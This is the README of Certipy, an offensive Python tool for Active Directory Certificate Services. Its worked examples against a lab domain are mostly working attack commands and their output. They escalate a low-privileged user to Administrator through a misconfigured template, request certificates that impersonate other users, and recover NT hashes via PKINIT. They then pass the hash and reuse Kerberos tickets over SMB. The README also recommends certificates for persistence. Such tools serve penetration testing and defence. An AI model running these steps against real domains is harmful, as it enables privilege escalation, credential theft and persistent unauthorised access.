# Certipy

Certipy is a Python tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).

Based on the C# variant [Certify](https://github.com/GhostPack/Certify) from [@harmj0y](https://twitter.com/harmj0y) and [@tifkin_](https://twitter.com/tifkin_).

## Table Of Contents
- [Certipy](#certipy)
  - [Installation](#installation)
  - [Usage](#usage)
  - [Examples](#examples)
    - [Auto](#auto)
    - [Find](#find)
      - [Find vulnerable templates](#find-vulnerable-templates)
      - [Find all templates](#find-all-templates)
    - [Request](#request)
      - [Request as another user](#request-as-another-user)
      - [Request as self](#request-as-self)
    - [Authenticate](#authenticate)
    - [Using the NT hash](#using-the-nt-hash)
    - [Using the credential cache](#using-the-credential-cache)
  - [Errors](#errors) 
  - [Credits](#credits) 

## Installation

```bash
$ python3 setup.py install
```

**Remember** to add the Python scripts directory to your path.

## Usage

```bash
$ certipy -h
usage: certipy [-h] [-debug] [-target-ip ip address] [-nameserver nameserver] [-dns-tcp] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-dc-ip ip address]
               target {find,req,auth,auto} ...

Active Directory certificate abuse

positional arguments:
  target                [[domain/]username[:password]@]<target name or address>
  {find,req,auth,auto}  Action
    find                Find certificate templates
    req                 Request a new certificate
    auth                Authenticate with a certificate
    auto                Automatically abuse certificate templates for privilege escalation

optional arguments:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials
                        cannot be found, it will use the ones specified in the command line
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter

connection:
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the
                        NetBIOS name and you cannot resolve it
  -nameserver nameserver
                        Nameserver for DNS resolution
  -dns-tcp              Use TCP instead of UDP for DNS queries

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
```

## Examples

### Auto

Automatically abuse certificate templates for privilege escalation. This action will try to find, request and authenticate as the `Administrator` user. Upon success, a credential cache will be saved and the NT hash will be decrypted from the PAC in the TGS_REP. 

To demonstrate how easy it is to misconfigure certificate templates, the default certificate template `Web Server` has been copied to `Copy of Web Server`. The only change was that the EKU `Server Authentication` was removed and that authenticated users are allowed to enroll. This will allow enrollees to specify the subject and use it for client authentication, i.e. authenticate as any user. If no EKUs are specified, then the certificate can be used for all purposes. Alternatively, one could add the `Client Authentication` EKU.

In this example, the user `john` is a low privileged user who is allowed to enroll for the `Copy of Web Server` template.

```bash
$ certipy 'predator/john:Passw0rd@dc.predator.local' auto
[*] Trying template 'Copy of Web Server' with CA 'predator-DC-CA'
[*] Generating RSA key
[*] Requesting certificate
[*] Request success
[*] Got certificate with UPN 'Administrator'
[*] Saved certificate to '1.crt'
[*] Saved private key to '1.key'
[*] Using UPN: 'Administrator@predator'
[*] Trying to get TGT...
[*] Saved credential cache to 'Administrator.ccache'
[*] Trying to retrieve NT hash for 'Administrator@predator'
[*] Got NT hash for 'Administrator@predator': fc525c9683e8fe067095ba2ddc971889
```

By default, the user `Administrator` is chosen. Use the `-user` parameter to create a certificate for another user.

### Find

The `find` action will find certificate templates that are enabled by one or more CAs. 

#### Find vulnerable templates

Use the `-vulnerable` parameter to only find vulnerable certificate templates.

```bash
$ certipy 'predator/john:Passw0rd@dc.predator.local' find -vulnerable
[*] Finding vulnerable certificate templates for 'john'
User
  Name                                  : predator\john
  Groups                                : 
Certificate Authorities
  0
    CA Name                             : predator-DC-CA
    DNS Name                            : dc.predator.local
    Certificate Subject                 : CN=predator-DC-CA, DC=predator, DC=local
    Certificate Serial Number           : 1976D0FEFCAFC9A84D02D305FA88D84D
    Certificate Validity Start          : 2021-10-06 11:32:01+00:00
    Certificate Validity End            : 2026-10-06 11:42:01+00:00
    User Specified SAN                  : Disabled
    CA Permissions
      Owner                             : BUILTIN\Administrator
      Access Rights
        ManageCertificates              : BUILTIN\Administrator
                                          predator\Domain Admins
                                          predator\Enterprise Admins
        ManageCa                        : BUILTIN\Administrator
                                          predator\Domain Admins
                                          predator\Enterprise Admins
        Enroll                          : Authenticated Users
Vulnerable Certificate Templates
  0
    CAs                                 : predator-DC-CA
    Template Name                       : Copy of Web Server
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Authorized Signatures Required      : 0
    Extended Key Usage                  : 
    Permissions
      Enrollment Permissions
        Enrollment Rights               : predator\Domain Admins
                                          predator\Enterprise Admins
                                          Authenticated Users
      Object Control Permissions
        Owner                           : predator\Administrator
        Write Owner Principals          : predator\Domain Admins
                                          predator\Enterprise Admins
                                          predator\Administrator
        Write Dacl Principals           : predator\Domain Admins
                                          predator\Enterprise Admins
                                          predator\Administrator
        Write Property Principals       : predator\Domain Admins
                                          predator\Enterprise Admins
                                          predator\Administrator
    Vulnerable Reasons                  : 'Authenticated Users' can enroll, enrollee supplies subject and template allows authentication
                                          'Authenticated Users' can enroll and template has dangerous EKU
```

Use the `-user` parameter to find vulnerable certificate templates for another user. By default, the current user will be used. 

#### Find all templates

```bash
$ certipy 'predator/john:Passw0rd@dc.predator.local' find
[*] Finding certificate templates for 'john'
User
  Name                                  : predator\john
  Groups                                : 
Certificate Authorities
  0
    CA Name                             : predator-DC-CA
    DNS Name                            : dc.predator.local
    Certificate Subject                 : CN=predator-DC-CA, DC=predator, DC=local
    Certificate Serial Number           : 1976D0FEFCAFC9A84D02D305FA88D84D
    Certificate Validity Start          : 2021-10-06 11:32:01+00:00
    Certificate Validity End            : 2026-10-06 11:42:01+00:00
    User Specified SAN                  : Disabled
    CA Permissions
      Owner                             : BUILTIN\Administrator
      Access Rights
        ManageCertificates              : BUILTIN\Administrator
                                          predator\Domain Admins
                                          predator\Enterprise Admins
        ManageCa                        : BUILTIN\Administrator
                                          predator\Domain Admins
                                          predator\Enterprise Admins
        Enroll                          : Authenticated Users
Certificate Templates
  0
    CAs                                 : predator-DC-CA
    Template Name                       : User
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Authorized Signatures Required      : 0
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights               : predator\Domain Admins
                                          predator\Domain Users
                                          predator\Enterprise Admins
      Object Control Permissions
        Owner                           : predator\Enterprise Admins
        Write Owner Principals          : predator\Domain Admins
                                          predator\Enterprise Admins
        Write Dacl Principals           : predator\Domain Admins
                                          predator\Enterprise Admins
        Write Property Principals       : predator\Domain Admins
                                          predator\Enterprise Admins
[...]
  11
    CAs                                 : predator-DC-CA
    Template Name                       : Copy of Web Server
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Authorized Signatures Required      : 0
    Extended Key Usage                  : 
    Permissions
      Enrollment Permissions
        Enrollment Rights               : predator\Domain Admins
                                          predator\Enterprise Admins
                                          Authenticated Users
      Object Control Permissions
        Owner                           : predator\Administrator
        Write Owner Principals          : predator\Domain Admins
                                          predator\Enterprise Admins
                                          predator\Administrator
        Write Dacl Principals           : predator\Domain Admins
                                          predator\Enterprise Admins
                                          predator\Administrator
        Write Property Principals       : predator\Domain Admins
                                          predator\Enterprise Admins
                                          predator\Administrator
```

### Request

Request a new certificate from a certificate template. By default, the current user specified in the `target` parameter will be used.

#### Request as another user

To request a certificate as another user, use the `-alt` parameter. This only applies to certificate templates, where the enrollee specifies the subject, or when the CA allows the enrollee to specify a UPN, i.e. `User Specified SAN` is set to `Enabled`.

In this example, the user `john` is a low privileged user. The certificate template `Copy of Web Server` is a copy of the default `Web Server` template. The EKU `Server Authentication` was removed, such that the template has no EKUs (No EKUs = any purpose). The default `Web Server` template allows the enrollee to supply the subject.

`john` will request a certificate valid for authentication as `jane`. The CA `predator-DC-CA` has `Copy of Web Server` enabled.

```bash
$ certipy 'predator/john:Passw0rd@dc.predator.local' req -template 'Copy of Web Server' -ca 'predator-DC-CA' -alt 'jane'
[*] Generating RSA key
[*] Requesting certificate
[*] Request success
[*] Got certificate with UPN 'jane'
[*] Saved certificate to '2.crt'
[*] Saved private key to '2.key'
```

The certificate and key will be DER encoded and saved to `<request ID>.(crt|key)`, where `request ID` is returned by the server.

#### Request as self

It is also possible to request a certificate for the current user. This is a good option for persistence since a certificate is not affected by password changes. By default, domain users are allowed to enroll in the default `User` template.

```bash
$ certipy 'predator/john:Passw0rd@dc.predator.local' req -template 'User' -ca 'predator-DC-CA'
[*] Generating RSA key
[*] Requesting certificate
[*] Request success
[*] Got certificate with UPN 'john@predator.local'
[*] Saved certificate to '3.crt'
[*] Saved private key to '3.key'
```

### Authenticate

The `auth` action will use the PKINIT Kerberos extension to authenticate with the provided certificate. The target user must be specified in the `target` parameter. If not specified, Certipy will try to extract the UPN from the certificate. The TGT will be saved in a credential cache to `<username>.ccache`. 

The NT hash will be extracted by using Kerberos U2U to request a TGS for the current user, where the encrypted PAC will contain the NT hash, which can be decrypted.

```bash
$ certipy 'predator/jane@dc.predator.local' auth -cert ./2.crt -key ./2.key
[*] Using UPN: 'jane@predator'
[*] Trying to get TGT...
[*] Saved credential cache to 'jane.ccache'
[*] Trying to retrieve NT hash for 'jane@predator'
[*] Got NT hash for 'jane@predator': 077cccc23f8ab7031726a3b70c694a49
```

### Using the NT hash

You can simply pass-the-hash (PTH) for many services. For instance SMB:
```bash
$ impacket-smbclient -hashes :fc525c9683e8fe067095ba2ddc971889 'predator.local/administrator@dc.predator.local'
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# who
host:   \\172.16.19.1, user: administrator, active:     1, idle:     0
```

### Using the credential cache

The credential cache currently holds a TGT. The TGT can be used to request TGSs for services. For instance, to request a TGS for the `cifs` (SMB) service at `dc.predator.local`:
```bash
$ # use TGT from Certipy
$ export KRB5CCNAME=./Administrator.ccache
$ # request TGS
$ impacket-getST -spn 'cifs/dc.predator.local' -dc-ip 172.16.19.100 -no-pass -k 'predator/administrator'
$ # use TGS from impacket-getST
$ export KRB5CCNAME=./administrator.ccache
$ # run smbclient with TGS (notice the FQDN)
$ impacket-smbclient -k -no-pass 'predator.local/administrator@dc.predator.local'
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# who
host:   \\172.16.19.1, user: Administrator, active:     1, idle:     0
```

**Note** that `impacket-getST` will overwrite the credential cache at `<username>.ccache`. Create a copy of the credential cache from Certipy before requesting a TGS with `impacket-getST`.

## Errors

Please submit any errors, issues, or questions under "Issues". A lot of errors can be caused by the user, tool, and target, but the error handling is not perfect.

## Credits

- [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_) for [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) and [Certify](https://github.com/GhostPack/Certify)
- [Dirk-jan](https://twitter.com/_dirkjan) for [PKINITtools](https://github.com/dirkjanm/PKINITtools)
